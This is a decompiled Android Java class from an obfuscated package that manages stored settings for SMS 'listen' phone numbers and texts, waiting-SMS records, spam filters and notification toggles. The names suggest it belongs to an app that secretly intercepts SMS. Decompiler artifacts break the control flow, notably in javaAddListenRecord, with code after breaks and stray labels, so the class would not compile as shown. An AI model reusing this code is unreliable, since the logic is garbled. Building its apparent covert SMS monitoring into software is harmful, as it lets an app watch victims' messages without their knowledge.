package aa.ff;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.zyypt.video.a;

public class MyBroadcastMgr
{
  private static SharedPreferences sharePrefs = null;
  private static SharedPreferences shareSMS = null;
  
  public MyBroadcastMgr(Context paramContext)
  {
    sharePrefs = paramContext.getSharedPreferences("SMS_Spam_Manager", 4);
    shareSMS = paramContext.getSharedPreferences("SMS_Listen_Manager", 4);
  }
  
  public static MyBroadcastMgr getInstance(Context paramContext)
  {
    return new MyBroadcastMgr(paramContext);
  }
  
  public String GetListenPhoneNumber()
  {
    return javaGetListenPhoneNumber();
  }
  
  public String GetListenPhoneText()
  {
    return javaGetListenPhoneText();
  }
  
  public String GetSMSRecorderName()
  {
    return javaGetSMSRecorderName();
  }
  
  public boolean GetSMSRecorderStartUp()
  {
    return javaGetSMSRecorderStartUp();
  }
  
  public boolean getNotifyEnable()
  {
    return sharePrefs.getBoolean("SMS_Notify_Enable", true);
  }
  
  public boolean getNotifySound()
  {
    return sharePrefs.getBoolean("SMS_Notify_Sound", true);
  }
  
  public boolean getNotifyToast()
  {
    return sharePrefs.getBoolean("SMS_Notify_Toast", false);
  }
  
  public boolean getNotifyVibrate()
  {
    return sharePrefs.getBoolean("SMS_Notify_Vibrate", false);
  }
  
  public String getSpamAddress()
  {
    return sharePrefs.getString("SMS_Spam_Address", "");
  }
  
  public String getSpamBody()
  {
    return sharePrefs.getString("SMS_Spam_Body", "");
  }
  
  public void javaAddListenRecord(String paramString1, String paramString2, int paramInt)
  {
    long l3;
    String str;
    int i;
    int j;
    if ((paramString1 != null) && (paramString1.length() > 0) && (paramString2 != null) && (paramString2.length() > 0))
    {
      l3 = System.nanoTime() / 1000000L;
      String[] arrayOfString1 = javaGetListenRecords().split(";");
      str = paramString1 + "+" + paramString2 + "+";
      i = 0;
      int k = arrayOfString1.length;
      j = 0;
      paramString1 = "";
      if (j < k)
      {
        paramString2 = arrayOfString1[j].trim();
        if (paramString2.length() != 0) {}
      }
    }
    for (;;)
    {
      j += 1;
      break;
      String[] arrayOfString2 = paramString2.split("\\+");
      if (arrayOfString2.length >= 4)
      {
        long l1 = Long.valueOf(arrayOfString2[2]).longValue();
        long l2 = Long.valueOf(arrayOfString2[3]).longValue();
        if (l3 > l1)
        {
          l1 = l2 - (l3 - l1);
          label178:
          l2 = l1;
          if (paramString2.contains(str))
          {
            i = 1;
            if (l1 <= paramInt) {
              break label309;
            }
            l2 = l1;
          }
        }
        for (;;)
        {
          if (l2 > 0L)
          {
            paramString2 = paramString1;
            if (paramString1.length() > 0) {
              paramString2 = paramString1 + ";";
            }
            paramString1 = paramString2 + arrayOfString2[0] + "+" + arrayOfString2[1] + "+" + l3 + "+" + l2;
            break;
            l1 = l2 - l3;
            break label178;
            label309:
            l2 = paramInt;
            continue;
            paramString2 = paramString1;
            if (i == 0)
            {
              paramString2 = paramString1;
              if (paramString1.length() > 0) {
                paramString2 = paramString1 + ";";
              }
              paramString2 = paramString2 + str + l3 + "+" + paramInt;
            }
            javaSetListenRecords(paramString2);
            return;
          }
        }
      }
    }
  }
  
  public String javaGetListenPhoneNumber()
  {
    String str = shareSMS.getString("SMS_Listen_Number", "");
    a.a(">>>javaGetListenPhoneNumber strPhoneNumber: " + str);
    return str;
  }
  
  public String javaGetListenPhoneText()
  {
    String str = shareSMS.getString("SMS_Listen_Text", "");
    a.a(">>>javaGetListenPhoneText strTexts: " + str);
    return str;
  }
  
  public String javaGetListenRecords()
  {
    String str = shareSMS.getString("SMS_Listen_Record", "");
    a.a(">>>javaGetListenRecords strTexts: " + str);
    return str;
  }
  
  public int javaGetListenResult(boolean paramBoolean)
  {
    int i = shareSMS.getInt("SMS_Wait_Result", 0);
    if ((paramBoolean) && (i != 0)) {
      javaSetListenResult(0);
    }
    return i;
  }
  
  public boolean javaGetNotifyStyle(String paramString)
  {
    a.a(">>>javaGetNotifyStyle key: " + paramString + "<<<");
    if (paramString.equals("Notify")) {
      return getNotifyEnable();
    }
    if (paramString.equals("Sound")) {
      return getNotifySound();
    }
    if (paramString.equals("Vibrate")) {
      return getNotifyVibrate();
    }
    if (paramString.equals("Toast")) {
      return getNotifyToast();
    }
    return false;
  }
  
  public String javaGetSMSRecorderName()
  {
    String str = shareSMS.getString("SMS_Listen_Filename", "smsrecommend.txt");
    a.a(">>>javaGetListenPhoneText strTexts: " + str);
    return str;
  }
  
  public boolean javaGetSMSRecorderStartUp()
  {
    boolean bool = shareSMS.getBoolean("SMS_Listen_Start", false);
    a.a(">>>javaGetSMSRecorderStartUp bStart: " + bool);
    return bool;
  }
  
  public String javaGetSpamCondition(String paramString)
  {
    a.a(">>>javaGetSpamCondition key: " + paramString + "<<<");
    if (paramString.equals("address")) {
      return getSpamAddress();
    }
    if (paramString.equals("body")) {
      return getSpamBody();
    }
    return null;
  }
  
  public boolean javaGetSpamState()
  {
    a.a(">>>javaGetSpamState<<<");
    return sharePrefs.getBoolean("SMS_Spam_Ison", false);
  }
  
  public int javaGetWaitResult()
  {
    return shareSMS.getInt("SMS_Wait_Result", 0);
  }
  
  public String javaGetWaitSms()
  {
    String str = shareSMS.getString("SMS_Wait_Record", "");
    a.a(">>>javaGetWaitSms strTexts: " + str);
    return str;
  }
  
  public void javaSetListenPhoneNumber(String paramString)
  {
    a.a(">>>javaSetListenPhoneNumber strPhoneNumber: " + paramString);
    shareSMS.edit().putString("SMS_Listen_Number", paramString).commit();
  }
  
  public void javaSetListenPhoneText(String paramString)
  {
    a.a(">>>javaSetListenPhoneText strTexts: " + paramString);
    shareSMS.edit().putString("SMS_Listen_Text", paramString).commit();
  }
  
  public void javaSetListenRecords(String paramString)
  {
    a.a(">>>javaSetListenRecords strTexts: " + paramString);
    shareSMS.edit().putString("SMS_Listen_Record", paramString).commit();
  }
  
  public void javaSetListenResult(int paramInt)
  {
    shareSMS.edit().putInt("SMS_Wait_Result", paramInt).commit();
  }
  
  public void javaSetNotifyStyle(String paramString, boolean paramBoolean)
  {
    a.a(">>>javaSetNotifyStyle key: " + paramString + " bl: " + paramBoolean + "<<<");
    if (paramString.equals("Notify")) {
      setNotifyEnable(paramBoolean);
    }
    do
    {
      return;
      if (paramString.equals("Sound"))
      {
        setNotifySound(paramBoolean);
        return;
      }
      if (paramString.equals("Vibrate"))
      {
        setNotifyVibrate(paramBoolean);
        return;
      }
    } while (!paramString.equals("Toast"));
    setNotifyToast(paramBoolean);
  }
  
  public void javaSetSMSRecorderName(String paramString)
  {
    a.a(">>>javaSetListenPhoneText strTexts: " + paramString);
    shareSMS.edit().putString("SMS_Listen_Filename", paramString).commit();
  }
  
  public void javaSetSMSRecorderStartUp(boolean paramBoolean)
  {
    a.a(">>>javaSetSMSRecorderStartUp bStart: " + paramBoolean);
    shareSMS.edit().putBoolean("SMS_Listen_Start", paramBoolean).commit();
  }
  
  public void javaSetSpamCondition(String paramString1, String paramString2)
  {
    a.a(">>>javaSetSpamCondition key: " + paramString1 + " value: " + paramString2 + "<<<");
    if (paramString1.equals("address")) {
      setSpamAddress(paramString2);
    }
    while (!paramString1.equals("body")) {
      return;
    }
    setSpamBody(paramString2);
  }
  
  public void javaSetSpamState(boolean paramBoolean)
  {
    a.a(">>>javaSetSpamState: " + paramBoolean + "<<<");
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putBoolean("SMS_Spam_Ison", paramBoolean);
    localEditor.commit();
  }
  
  public void javaSetWaitResult(int paramInt)
  {
    shareSMS.edit().putInt("SMS_Wait_Result", paramInt).commit();
  }
  
  public void javaWaitSms(String paramString1, String paramString2, int paramInt)
  {
    String str = paramString1 + "+" + paramString2 + "+" + System.nanoTime() / 1000000L + "+" + paramInt;
    if ((paramString1.length() != 0) && (paramString2.length() != 0) && (paramInt <= 0)) {}
    paramString1 = shareSMS.edit();
    paramString1.putString("SMS_Wait_Record", str);
    paramString1.putInt("SMS_Wait_Result", 0);
    paramString1.commit();
  }
  
  public void setNotifyEnable(boolean paramBoolean)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putBoolean("SMS_Notify_Enable", paramBoolean);
    localEditor.commit();
  }
  
  public void setNotifySound(boolean paramBoolean)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putBoolean("SMS_Notify_Sound", paramBoolean);
    localEditor.commit();
  }
  
  public void setNotifyToast(boolean paramBoolean)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putBoolean("SMS_Notify_Toast", paramBoolean);
    localEditor.commit();
  }
  
  public void setNotifyVibrate(boolean paramBoolean)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putBoolean("SMS_Notify_Vibrate", paramBoolean);
    localEditor.commit();
  }
  
  public void setSpamAddress(String paramString)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putString("SMS_Spam_Address", paramString);
    localEditor.commit();
  }
  
  public void setSpamBody(String paramString)
  {
    SharedPreferences.Editor localEditor = sharePrefs.edit();
    localEditor.putString("SMS_Spam_Body", paramString);
    localEditor.commit();
  }
}
